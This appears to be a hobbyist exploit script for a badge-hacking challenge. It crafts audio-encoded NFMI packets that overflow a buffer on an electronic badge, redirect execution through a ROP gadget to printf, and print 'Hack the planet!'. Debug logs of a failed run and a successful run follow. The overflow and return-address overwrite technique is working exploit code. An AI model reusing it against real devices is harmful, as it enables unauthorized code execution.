#!/bin/sh
set -e # exit on any error

CR=$'\x0D'   # this works with "write_signal.py -a" but all attempts to me vars for LF, EOL and TAB don't work?!?!


echo -e Creating B20 # length 21: "B" then twenty (0x14) zeros (we can only control 11 data bytes per packet, anything longer than that is filled in with a 0 by the hacked NFMI firmware)
python write_signal.py -q 0 0 0 0  15  42 0 0 0  0 0 0 0  0 0 0
./craft_multipart_attack.sh
sox synthetic_signal.wav recordings/silence_1000ms.wav synthetic_print_seth.wav


echo -e R4 R5 R6 
# R4 points to string address 20002FA8 + 8 = 20002FB0   (R4 is then moved to R0 by code at PC)
# R5 and R6 are unused
python write_signal.py -q 0 0 0 0  C  B0 2F 00 20  00 00 00 00  00 00 00
./craft_multipart_attack.sh
sox synthetic_print_seth.wav synthetic_signal.wav recordings/silence_1000ms.wav temp/out.wav #concat with delay
mv temp/out.wav synthetic_print_seth.wav


echo -e PC R4_2 PC_2
#PC = 1 (for THUMB) + 2DE8 : MOVS R0, R4; POP {R4, PC}  (2de9 in human, 2ddb in stock with nfmi hack, 2e4f in both print_recv vers)
#PC_2 = 42d -> printf()
python write_signal.py -q 0 0 0 0  C  4f 2E 00 00  00 00 00 00  2D 04 00
./craft_multipart_attack.sh
sox synthetic_print_seth.wav synthetic_signal.wav recordings/silence_1000ms.wav temp/out.wav #concat with delay
mv temp/out.wav synthetic_print_seth.wav


echo -e '"Hack the pl"'
python write_signal.py -q -a  0 0 0 0  b  H a c k ' ' t h e ' ' p l
./craft_multipart_attack.sh
sox synthetic_print_seth.wav synthetic_signal.wav recordings/silence_1000ms.wav temp/out.wav #concat with delay
mv temp/out.wav synthetic_print_seth.wav


echo -e '"anet!\\d\\a\\0EBE"'
#can't seem to use -a for ASCII with LF, tab or EOL
# Maybe extra B E will help the badge get unstuck?
python write_signal.py -q  0 0 0 0  b  61 6e 65 74 21 0d 0a 00 45 42 45
./craft_multipart_attack.sh
sox synthetic_print_seth.wav synthetic_signal.wav recordings/silence_2281ms.wav temp/out.wav #concat with delay
mv temp/out.wav synthetic_print_seth.wav



: <<'END'
Even under perfect conditions this attack can fail. This is super annoying when you get zero feedback from the badge, so I made a modified version to spit out everything it recieves.

Here is an example of failure due to the the NFMI chip somehow sending the packets to the badge out of order (failure due to dropped packets looks very similar):

Found 'R' (0x52) while looking for 'B'
Found 'O' (0x4f) while looking for 'B'
Found 'R' (0x52) while looking for 'B'
Found 'C' (0x43) while looking for 'B'	 <-- these first 4 are in the buffer after a reboot. "RO" and "RC" have something to do with queue checks, maybe.
Found 'O' (0x4f) while looking for 'B'       
Found '.' (0x2e) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '-' (0x2d) while looking for 'B'
Found '' (0x4) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found '' (0x0) while looking for 'B'
Found 'S' (0x53) while looking for 'B'
Found 'e' (0x65) while looking for 'B'
Found 't' (0x74) while looking for 'B'
Found 'h' (0x68) while looking for 'B'
' (0xd) while looking for 'B'
Found '
       ' (0xa) while looking for 'B'
Found ' ' (0x9) while looking for 'B'
Found 'E' (0x45) while looking for 'B'
Found 'B' (0x42) while looking for 'B'
B 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 b0 2f 0 20 0 0 0 0 0 0 0 0 b0 2f 0 20 0 0 0 0 0 0 0 0 53 65
End of buffer no E found!

Note: the badge is still waiting for a packet, and is possibly in an unstable state. Sending it one normal packet with B...E will return it to interactive mode prompt, but it is probably still unstable, so a reset is better.
Reset by power cycling, or maybe send a normal packet then type "^" in the console, or connect with SWD (with J-Link: connect, then r g)



Example of success:

Found 'R' (0x52) while looking for 'B'
Found 'O' (0x4f) while looking for 'B'
Found 'R' (0x52) while looking for 'B'
Found 'C' (0x43) while looking for 'B'
Found 'B' (0x42) while looking for 'B'
B 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 b0 2f 0 20 0 0 0 0 0 0 0 0 4f 2e 0 0 0 0 0 0 2d 4 0 0 48 61 63 6b 20 74 68 65 20 70 6c 61 6e 65 74 21 d a 0 E -- length = 63
Hack the planet!▒

END